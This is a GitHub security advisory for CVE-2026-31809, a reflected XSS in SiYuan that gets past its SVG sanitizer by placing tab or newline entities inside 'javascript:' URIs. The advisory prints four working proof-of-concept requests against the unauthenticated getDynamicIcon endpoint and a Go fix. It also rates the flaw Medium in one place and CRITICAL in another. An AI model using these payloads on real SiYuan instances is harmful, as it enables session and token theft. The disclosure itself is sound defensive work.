# [M] SiYuan has a SVG Sanitizer Bypass via Whitespace in `javascript:` URI — Unauthenticated XSS

## Summary
Severity: Medium
Advisory: GHSA-pmc9-f5qr-2pcr
CVE: CVE-2026-31809
CWE: CWE-79
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N (CVSS_V4)
Published: 2026-03-10
Source: https://github.com/advisories/GHSA-pmc9-f5qr-2pcr
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0 <0.0.0-20260310025236-297bd526708f

## Details
# SVG Sanitizer Bypass via Whitespace in `javascript:` URI — Unauthenticated XSS

## Summary

SiYuan's SVG sanitizer (`SanitizeSVG`) checks `href` attributes for the `javascript:` prefix using `strings.HasPrefix()`. However, inserting ASCII tab (`&#9;`), newline (`&#10;`), or carriage return (`&#13;`) characters inside the `javascript:` string bypasses this prefix check. Browsers strip these characters per the WHATWG URL specification before parsing the URL scheme, so the JavaScript still executes. This allows an attacker to inject executable JavaScript into the unauthenticated `/api/icon/getDynamicIcon` endpoint, creating a reflected XSS.

This is a second bypass of the fix for CVE-2026-29183 (fixed in v3.5.9), [distinct from the `<animate>` element bypass](https://github.com/siyuan-note/siyuan/security/advisories/GHSA-5hc8-qmg8-pw27).

## Affected Component

- **File:** `kernel/util/misc.go`
- **Function:** `SanitizeSVG()` (lines 234-319)
- **Specific check:** Line 271 — `strings.HasPrefix(val, "javascript:")`
- **Endpoint:** `GET /api/icon/getDynamicIcon?type=8&content=...` (unauthenticated)
- **Version:** SiYuan <= 3.5.9

## Root Cause

The sanitizer uses Go's `html.Parse` which decodes HTML entities in attribute values. When the input contains `java&#9;script:alert(1)`, the parser decodes `&#9;` to a literal tab character (U+0009). The sanitizer then checks:

```go
val := strings.TrimSpace(strings.ToLower(a.Val))
// val is now "java\tscript:alert(1)"

if strings.HasPrefix(val, "javascript:") {
    continue  // This check FAILS — tab breaks the prefix match
}
```

`strings.TrimSpace` only removes leading/trailing whitespace, not internal whitespace. The `HasPrefix` check fails because `"java\tscript:..."` does not start with `"javascript:"`.

However, per the [WHATWG URL Standard](https://url.spec.whatwg.org/#url-parsing), step 1 of URL parsing removes all ASCII tab and newline characters (U+0009, U+000A, U+000D) from the input. So the browser parses `java\tscript:alert(1)` as `javascript:alert(1)`.

## Proof of Concept

### Vector 1: Tab character (`&#9;`)

```
GET /api/icon/getDynamicIcon?type=8&content=</text><a href="java&#9;script:alert(document.domain)"><text x="50%25" y="80%25" fill="red" style="font-size:60px">Click me</text></a><text>&color=blue
```

### Vector 2: Newline character (`&#10;`)

```
GET /api/icon/getDynamicIcon?type=8&content=</text><a href="java&#10;script:alert(document.domain)"><text x="50%25" y="80%25" fill="red" style="font-size:60px">Click me</text></a><text>&color=blue
```

### Vector 3: Carriage return (`&#13;`)

```
GET /api/icon/getDynamicIcon?type=8&content=</text><a href="java&#13;script:alert(document.domain)"><text x="50%25" y="80%25" fill="red" style="font-size:60px">Click me</text></a><text>&color=blue
```

### Vector 4: Multiple whitespace characters

```
GET /api/icon/getDynamicIcon?type=8&content=</text><a href="j&#9;a&#10;v&#13;a&#9;s&#10;c&#13;r&#9;i&#10;p&#13;t:alert(document.domain)"><text x="50%25" y="80%25" fill="red" style="font-size:60px">Click me</text></a><text>&color=blue
```

### Processing trace

1. **Input:** `<a href="java&#9;script:alert(document.domain)">`
2. **html.Parse:** Decodes entity → attribute value = `java\tscript:alert(document.domain)`
3. **Sanitizer:** `TrimSpace(ToLower(val))` = `java\tscript:alert(document.domain)` (tab preserved in middle)
4. **HasPrefix check:** `"java\tscript:..."` does NOT start with `"javascript:"` → **passes through**
5. **html.Render:** Outputs literal tab character in href (tabs are not HTML-special)
6. **Browser URL parser:** Strips tab per WHATWG URL spec → `javascript:alert(document.domain)`
7. **User clicks link → JavaScript executes**

## Attack Scenario

Same as CVE-2026-29183 / advisory #01:
1. Attacker crafts a malicious `getDynamicIcon` URL
2. Victim navigates to the URL (or is redirected)
3. SVG renders with `Content-Type: image/svg+xml`
4. Victim clicks the text link in the SVG
5. JavaScript executes in SiYuan's origin
6. Attacker steals session cookies, API tokens, or makes authenticated API calls

## Impact

- **Severity:** CRITICAL (CVSS ~9.1)
- **Type:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
- Unauthenticated reflected XSS via SVG injection
- Executes in the SiYuan application origin
- Bypasses the fix for CVE-2026-29183
- Independent of the `<animate>` element bypass (advisory #01) — different root cause

## Suggested Fix

Replace the simple `HasPrefix` check with whitespace-stripped comparison:

```go
// Strip ASCII tab, newline, CR before checking for javascript: prefix
cleaned := strings.Map(func(r rune) rune {
    if r == '\t' || r == '\n' || r == '\r' {
        return -1  // Remove character
    }
    return r
}, val)

if key == "href" || key == "xlink:href" || key == "xlinkhref" {
    if strings.HasPrefix(cleaned, "javascript:") {
        continue
    }
    if strings.HasPrefix(cleaned, "data:") {
        if strings.Contains(cleaned, "text/html") || strings.Contains(cleaned, "image/svg+xml") || strings.Contains(cleaned, "application/xhtml+xml") {
            continue
        }
    }
}
```

This should also be applied to the `data:` URI check, as the same whitespace bypass could potentially affect it.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-pmc9-f5qr-2pcr
- https://nvd.nist.gov/vuln/detail/CVE-2026-31809
- https://github.com/siyuan-note/siyuan
- https://github.com/siyuan-note/siyuan/releases/tag/v3.5.10
